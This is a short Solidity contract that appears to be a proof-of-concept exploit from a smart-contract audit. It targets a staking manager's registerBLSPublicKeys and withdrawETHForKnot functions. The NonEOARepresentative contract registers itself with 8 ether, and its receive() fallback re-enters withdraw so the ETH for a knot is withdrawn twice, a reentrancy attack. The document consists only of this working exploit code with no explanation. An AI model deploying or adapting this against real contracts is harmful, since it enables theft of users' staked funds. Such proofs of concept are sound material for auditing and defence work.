interface IManager {
    function registerBLSPublicKeys(
        bytes[] calldata _blsPublicKeys,
        bytes[] calldata _blsSignatures,
        address _eoaRepresentative
    ) external payable;
    function withdrawETHForKnot(
        address _recipient,
        bytes calldata _blsPublicKeyOfKnot
    ) external;
}
contract NonEOARepresentative {
    address manager;
    bool state;
    constructor(address _manager) payable {
        bytes[] memory publicKeys = new bytes[](2);
        publicKeys[0] = "publicKeys1";
        publicKeys[1] = "publicKeys2";
        bytes[] memory signature = new bytes[](2);
        signature[0] = "signature1";
        signature[1] = "signature2";
        IManager(_manager).registerBLSPublicKeys{value: 8 ether}(
            publicKeys,
            signature,
            address(this)
        );
        manager = _manager;
    }
    function withdraw(bytes calldata _blsPublicKeyOfKnot) external {
        IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);
    }
    receive() external payable {
        if(!state) {
            state = true;
            this.withdraw("publicKeys1");
        }
    }
}